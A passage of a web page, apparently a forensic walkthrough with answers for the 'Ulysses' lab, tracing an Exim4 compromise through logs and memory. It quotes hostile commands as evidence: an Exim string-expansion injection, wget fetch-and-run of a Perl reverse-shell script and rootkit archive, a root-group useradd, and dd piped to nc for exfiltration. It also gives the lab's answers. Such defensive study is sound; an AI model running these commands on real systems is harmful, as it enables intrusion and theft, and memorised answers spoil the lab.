                    <CopyButton text={"Feb  6 15:10:22 victoria dhclient: bound to 192.168.56.102 -- renewal in 1435 seconds.\n\n# Volatility command:\nvol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_ifconfig"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"Feb  6 15:10:22 victoria dhclient: bound to 192.168.56.102 -- renewal in 1435 seconds.\n\n# Volatility command:\nvol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_ifconfig"}</code>
                  </pre>
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104094925.png"
                    alt={"Ulysses forensic investigation screenshot for What is the victim's IP address?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      192.168.56.102
                    </span>
                  </div>
                  <CopyButton text={"192.168.56.102"} />
                </div>
              </section>

              {/* Operation Banner: Remote Service Exploitation (Exim4) */}
              <div id="part-exploit" className="scroll-mt-24 p-6 rounded-3xl bg-gradient-to-r from-zinc-900/90 via-[#0e0e14] to-zinc-900/80 border border-zinc-700/60 shadow-xl space-y-2">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <span className="px-3 py-1 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-mono text-xs font-bold uppercase tracking-wider">
                    Phase 02 • EXPLOIT/RCE
                  </span>
                  <span className="text-xs font-mono text-zinc-400">
                    3 QUESTIONS
                  </span>
                </div>
                <h2 className="text-xl sm:text-2xl font-bold text-white font-[family-name:var(--font-silkscreen)] tracking-wide">
                  Remote Service Exploitation (Exim4)
                </h2>
              </div>

              {/* Question 05 */}
              <section id="q5" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q05 • C2
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /var/log/exim4/mainlog & rejectlog
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q5: What are the attacker's two IP addresses?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Advanced adversaries separate exploit delivery from payload hosting and C2 listener infrastructure to increase resilience and complicate attribution." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "While SSH brute-force traffic originated from <code>192.168.56.1</code>, investigating the mail server logs reveals the complete two-stage intrusion." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Navigate into <code>var \u2794 log \u2794 exim4</code> and open <code>mainlog</code> (or <code>rejectlog</code>)." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>1. Exploit Delivery IP (<code>192.168.56.101</code>):</strong>" }} />
                  <p dangerouslySetInnerHTML={{ __html: "Starting at 15:07:13, the remote host <code>192.168.56.101</code> connected to the SMTP port and delivered malicious string-expansion buffers: <code>rejected from &lt;root@local.com&gt; H=(abcde.com) [192.168.56.101]: message too big</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>2. Staging & Reverse Shell IP (<code>192.168.56.1</code>):</strong>" }} />
                  <p dangerouslySetInnerHTML={{ __html: "Inspecting the injected ACL string shows the commands executed upon successful exploitation: <code>wget http://192.168.56.1/c.pl -O /tmp/c.pl; perl /tmp/c.pl 192.168.56.1 4444</code> and <code>wget http://192.168.56.1/rk.tar -O /tmp/rk.tar</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Both IPs are confirmed: <code>192.168.56.1, 192.168.56.101</code>." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"2011-02-06 15:07:13 rejected from <root@local.com> H=(abcde.com) [192.168.56.101]: message too big\n2011-02-06 15:08:13 H=(abcde.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string ...\nwget http://192.168.56.1/c.pl -O /tmp/c.pl; perl /tmp/c.pl 192.168.56.1 4444\nwget http://192.168.56.1/rk.tar -O /tmp/rk.tar\nuseradd --gid root --create-home --password ... ulysses"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"2011-02-06 15:07:13 rejected from <root@local.com> H=(abcde.com) [192.168.56.101]: message too big\n2011-02-06 15:08:13 H=(abcde.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string ...\nwget http://192.168.56.1/c.pl -O /tmp/c.pl; perl /tmp/c.pl 192.168.56.1 4444\nwget http://192.168.56.1/rk.tar -O /tmp/rk.tar\nuseradd --gid root --create-home --password ... ulysses"}</code>
                  </pre>
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104122151.png"
                    alt={"Ulysses forensic investigation screenshot for What are the attacker's two IP addresses?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104122117.png"
                    alt={"Ulysses forensic investigation screenshot for What are the attacker's two IP addresses?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      192.168.56.1, 192.168.56.101
                    </span>
                  </div>
                  <CopyButton text={"192.168.56.1, 192.168.56.101"} />
                </div>
              </section>

              {/* Question 07 */}
              <section id="q7" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q07 • SVC
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /var/log/exim4/mainlog
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q7: What service was exploited to gain access to the system?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Distinguishing diversions from actual intrusion vectors is a fundamental principle of incident triage." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Did SSH succeed?</strong> Reviewing <code>/var/log/auth.log</code> shows all 32 attempts failed. No successful authentication session was established for user <code>ulysses</code>. The brute force was merely loud noise." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Hunting Exposed Services:</strong> Checking service logs under <code>/var/log/</code> leads to <code>/var/log/exim4/mainlog</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The Exim mail transfer agent (<code>exim4</code>) was listening on TCP port 25." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The logs capture the exploit payload injected into the Exim ACL string: <code>temporarily rejected MAIL: failed to expand ACL string \"${run{/bin/sh -c 'wget...'}}\"</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The service exploited for Initial Access was <code>exim4</code> (or <code>exim</code>)." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"2011-02-06 15:08:13 H=(abcde.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string \"${run{/bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl...'}}\""} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"2011-02-06 15:08:13 H=(abcde.com) [192.168.56.101] temporarily rejected MAIL <root@local.com>: failed to expand ACL string \"${run{/bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl...'}}\""}</code>
                  </pre>
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104122151.png"
                    alt={"Ulysses forensic investigation screenshot for What service was exploited to gain access to the system?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      exim4
                    </span>
                  </div>
                  <CopyButton text={"exim4"} />
                </div>
              </section>

              {/* Question 08 */}
              <section id="q8" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q08 • CVE
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /var/log/dpkg.log & CVE Database
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q8: What CVE was used to exploit the mail server?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Vulnerability correlation links the observed exploit payload signature and installed software version to a standardized CVE identifier." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Clue 1 \u2014 Installed Package Version:</strong> Open <code>/var/log/dpkg.log</code> inside <code>victoria-v8.sda1.img</code>. Locate the Exim package installation line: <code>status installed exim4-daemon-light 4.69-9</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Clue 2 \u2014 Payload Signature:</strong> The log error <code>failed to expand ACL string \"${run{...}}\"</code> points directly to Exim string-expansion evaluation." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Clue 3 \u2014 Threat Intel Cross-Reference:</strong> Searching for Exim 4.69 remote code execution string expansion identifies <strong>CVE-2010-4344</strong> (Exim &lt; 4.72 string-expansion buffer overflow permitting remote code execution as Debian-exim/root)." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"$ grep exim4 /var/log/dpkg.log\nstatus installed exim4-daemon-light 4.69-9\n\n# Threat Intel Correlation:\n# Exim 4.69 + String Expansion ACL Execution = CVE-2010-4344"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"$ grep exim4 /var/log/dpkg.log\nstatus installed exim4-daemon-light 4.69-9\n\n# Threat Intel Correlation:\n# Exim 4.69 + String Expansion ACL Execution = CVE-2010-4344"}</code>
                  </pre>
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104203932.png"
                    alt={"Ulysses forensic investigation screenshot for What CVE was used to exploit the mail server?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      CVE-2010-4344
                    </span>
                  </div>
                  <CopyButton text={"CVE-2010-4344"} />
                </div>
              </section>

              {/* Operation Banner: Persistence, Rootkit & Exfiltration */}
              <div id="part-post" className="scroll-mt-24 p-6 rounded-3xl bg-gradient-to-r from-zinc-900/90 via-[#0e0e14] to-zinc-900/80 border border-zinc-700/60 shadow-xl space-y-2">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <span className="px-3 py-1 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-mono text-xs font-bold uppercase tracking-wider">
                    Phase 03 • ROOTKIT/EXFIL
                  </span>
                  <span className="text-xs font-mono text-zinc-400">
                    4 QUESTIONS
                  </span>
                </div>
                <h2 className="text-xl sm:text-2xl font-bold text-white font-[family-name:var(--font-silkscreen)] tracking-wide">
                  Persistence, Rootkit & Exfiltration
                </h2>
              </div>

              {/* Question 09 */}
              <section id="q9" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q09 • TAR
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /tmp/ & /var/log/exim4/mainlog
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q9: The attacker downloaded two files to the server. What is the name of the compressed one?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Post-exploitation staging commonly utilizes world-writable directories such as <code>/tmp</code> or <code>/dev/shm</code> to stage reconnaissance tools, backdoors, and rootkits." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "From the injected Exim command in Q5, two download operations were staged:" }} />
                  <p dangerouslySetInnerHTML={{ __html: "1. <code>wget http://192.168.56.1/c.pl -O /tmp/c.pl</code> (Uncompressed Perl privilege escalation script)." }} />
                  <p dangerouslySetInnerHTML={{ __html: "2. <code>wget http://192.168.56.1/rk.tar -O /tmp/rk.tar</code> (Compressed archive containing the rootkit toolkit)." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Open <code>victoria-v8.sda1.img</code> in 7-Zip or FTK Imager and navigate into <code>tmp/</code>: Both <code>c.pl</code> and <code>rk.tar</code> reside on disk." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The compressed archive is <code>rk.tar</code>." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"wget http://192.168.56.1/c.pl -O /tmp/c.pl;\nwget http://192.168.56.1/rk.tar -O /tmp/rk.tar\n\n$ ls -l /tmp/\n-rw-r--r-- 1 Debian-exim Debian-exim   3412 Feb  6 15:08 c.pl\n-rw-r--r-- 1 Debian-exim Debian-exim 143360 Feb  6 15:08 rk.tar"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"wget http://192.168.56.1/c.pl -O /tmp/c.pl;\nwget http://192.168.56.1/rk.tar -O /tmp/rk.tar\n\n$ ls -l /tmp/\n-rw-r--r-- 1 Debian-exim Debian-exim   3412 Feb  6 15:08 c.pl\n-rw-r--r-- 1 Debian-exim Debian-exim 143360 Feb  6 15:08 rk.tar"}</code>
                  </pre>
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104210922.png"
                    alt={"Ulysses forensic investigation screenshot for The attacker downloaded two files to the server. What is the name of the compressed one?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      rk.tar
                    </span>
                  </div>
                  <CopyButton text={"rk.tar"} />
                </div>
              </section>

              {/* Question 06 */}
              <section id="q6" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q06 • PID
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.memdump.img -> Volatility linux_pslist / linux_netstat
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q6: What is the PID of the malicious netcat process?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Live volatile processes spawned dynamically in memory leave no traces in standard disk system logs unless audited by kernel hooks." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Disk vs Memory Rule:</strong> Ad-hoc utilities like <code>nc</code> (Netcat) do not communicate with syslog or write execution logs to <code>/var/log/</code>. Active execution state exists strictly in volatile RAM." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Analyze the memory dump <code>victoria-v8.memdump.img</code> using Volatility with the provided <code>Debian5_26</code> profile." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Execute <code>vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat</code> to display all active sockets and associated PIDs." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Locate the outbound connection communicating with attacker IP <code>192.168.56.1</code> on port <code>8888</code>: Handled by process <code>nc</code> with <strong>PID 2169</strong>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Cross-validate with <code>linux_pslist</code>: PID 2169 confirms <code>nc</code> running as a child process." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"$ vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat\nUNIX 2169 nc ...\nTCP  192.168.56.102:48321 -> 192.168.56.1:8888 ESTABLISHED nc (PID: 2169)"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"$ vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat\nUNIX 2169 nc ...\nTCP  192.168.56.102:48321 -> 192.168.56.1:8888 ESTABLISHED nc (PID: 2169)"}</code>
                  </pre>
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      2169
                    </span>
                  </div>
                  <CopyButton text={"2169"} />
                </div>
              </section>

              {/* Question 10 */}
              <section id="q10" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q10 • PORT
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.memdump.img -> Volatility linux_netstat (or disk bash history)
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q10: Which port did the nc command use for data exfiltration?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Following privilege escalation, the adversary initiated mass forensic exfiltration targeting both the physical disk and memory." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "Reviewing the Volatility network connection list from Q6 shows:" }} />
                  <p dangerouslySetInnerHTML={{ __html: "<code>nc</code> (PID 2169) opened a direct TCP socket from victim IP <code>192.168.56.102</code> to <code>192.168.56.1:8888</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The underlying command executed was a bulk disk and memory carving exfiltration pipeline:" }} />
                  <p dangerouslySetInnerHTML={{ __html: "<code>dd if=/dev/sda1 | nc 192.168.56.1 8888</code> (streaming the raw partition)." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<code>memdump | nc 192.168.56.1 8888</code> (streaming volatile RAM)." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The destination port used for data exfiltration was <code>8888</code>." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"# Volatility linux_netstat output:\nTCP 192.168.56.102:48321 192.168.56.1:8888 ESTABLISHED nc/2169\n\n# Exfiltration pipeline executed:\ndd if=/dev/sda1 | nc 192.168.56.1 8888"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"# Volatility linux_netstat output:\nTCP 192.168.56.102:48321 192.168.56.1:8888 ESTABLISHED nc/2169\n\n# Exfiltration pipeline executed:\ndd if=/dev/sda1 | nc 192.168.56.1 8888"}</code>
                  </pre>
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      8888
                    </span>
                  </div>
                  <CopyButton text={"8888"} />
                </div>
              </section>

              {/* Question 11 */}
              <section id="q11" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q11 • FW
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /tmp/rk.tar -> install.sh
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q11: Which port did the attacker try to block on the firewall?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Malware authors frequently configure host firewall rules to terminate communication from rival botnets and lock out competing threat actors." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "Extract the rootkit archive <code>rk.tar</code> recovered from <code>/tmp/</code> in Q9." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Inside the extracted toolkit, open <code>install.sh</code> in a text editor." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Search for firewall manipulation commands: <code>iptables</code> or <code>dport</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Notice the rule inserted into system startup scripts (<code>/etc/init.d/boot.local</code>, <code>/etc/rc.d/rc.local</code>):" }} />
                  <p dangerouslySetInnerHTML={{ __html: "<code>/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Threat Intel Context:</strong> Port <strong>45295</strong> is the default hardcoded command-and-control beacon port for the classic <strong>SHV4 / SHV5 (SuckIT)</strong> Linux rootkits. By dropping outbound traffic to port 45295, the adversary severed existing competitor botnet implants and secured exclusive control over the compromised host." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The blocked port is <code>45295</code>." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"# Excerpt from install.sh in rk.tar:\n/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP\necho \"/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP\" >> /etc/init.d/boot.local\necho \"/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP\" >> /etc/rc.d/rc.local"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"# Excerpt from install.sh in rk.tar:\n/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP\necho \"/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP\" >> /etc/init.d/boot.local\necho \"/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP\" >> /etc/rc.d/rc.local"}</code>
                  </pre>
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
